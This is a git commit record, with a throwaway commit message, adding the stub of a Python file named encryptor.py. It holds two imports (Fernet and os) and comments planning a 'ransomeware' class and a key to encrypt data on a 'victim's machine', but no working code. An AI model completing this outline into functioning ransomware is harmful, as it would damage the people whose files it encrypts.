6fb0f4100e87cf20eea083ab0404ab5984973a96
danbo72 <danielakpan72@gmail.com>
2025-10-03 12:17:05 +0100

    jjkjkjj

---
+++ encryptor.py
@@ -0,0 +1,8 @@
+from cryptography.fernet import Fernet #used to encrypt files
+import os #to get root system
+
+# declare a class called ransomeware
+
+# define a function that will be used for fernet object, encrypt and decrypt method
+
+# define a function used to generate symetric key used to encrypt data on victim's machine
